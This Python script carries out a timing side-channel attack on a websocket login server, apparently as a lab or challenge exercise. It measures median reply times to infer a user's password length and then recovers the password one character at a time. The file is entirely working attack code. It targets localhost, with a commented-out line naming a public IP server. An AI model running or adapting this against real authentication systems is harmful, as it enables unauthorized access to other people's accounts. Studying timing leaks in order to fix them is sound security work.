import asyncio, websockets, statistics, time
from json import dumps, loads
from time import sleep

ws = None
CHARSET = "abcdefghijklmnopqrstuvwxyz0123456789"


async def open_connection():
    global ws
    #server_address = "ws://20.224.193.77:8080"
    server_address = "ws://127.0.0.1:3840"
    ws = await websockets.connect(server_address)


async def client_connect(username, password):
    global ws

    for _ in range(10):
        try:
            await ws.send(dumps([username, password]))
            reply = await ws.recv()
            return loads(reply)
        except:
            await asyncio.sleep(0.01)

    return "failed connection"


# check with variables if server connects
async def call_server(username, password):
    reply = await client_connect(username, password)
    sleep(0.001)
    return reply


# measure how long it takes for server to reply
async def call_server_timed(username, password):
    start = time.perf_counter()
    reply = await client_connect(username, password)
    end = time.perf_counter()
    sleep(0.001)
    return reply, (end - start)


# measure one guess multiple times and take the median
async def time_guess(username, guess, tries=50):
    times = []
    for _ in range(tries):
        _, t = await call_server_timed(username, guess)
        times.append(t)
    return statistics.median(times)


# try every length of strings up to 15, and measure which takes the most time
async def find_length(username, max_len=16, tries=50):
    best_time = 0
    best_length = 0

    for length in range(1, max_len):
        guess = "a" * length

        med = await time_guess(username, guess, tries)
        print("length:", length, "time:", med)

        if med > best_time:
            best_time = med
            best_length = length

    print("password length:", best_length)
    return best_length


# use length from find_length() to determine how long each guess should be. and determine best_char by how long it takes
# example:  guess = 'haaaaaa'
#           next guess = 'huaaaaa'
async def crack_password(username, length, tries=50):
    found = ""

    for pos in range(length):
        best_char = None
        best_time = -1.0

        for c in CHARSET:
            guess = found + c + ("a" * (length - len(found) - 1))
            med = await time_guess(username, guess, tries)

            if med > best_time:
                best_time = med
                best_char = c

        found += best_char
        print(f"scanned position {pos} | winner is {best_char} | password: {found}")

    print("password:", found)
    return found


async def main():
    # open a conection
    await open_connection()

    # test connection
    print("CHECK CONNECT:", await call_server("000000", "hunter2"))

    # 1) find length of the password
    length = await find_length("000000", max_len=16, tries=50)

    # 2) crack the password
    password = await crack_password("000000", length, tries=50)

    # 3) print the results
    print("CHECK RESULT:", await call_server("000000", password))


# start code
if __name__ == "__main__":
    asyncio.run(main())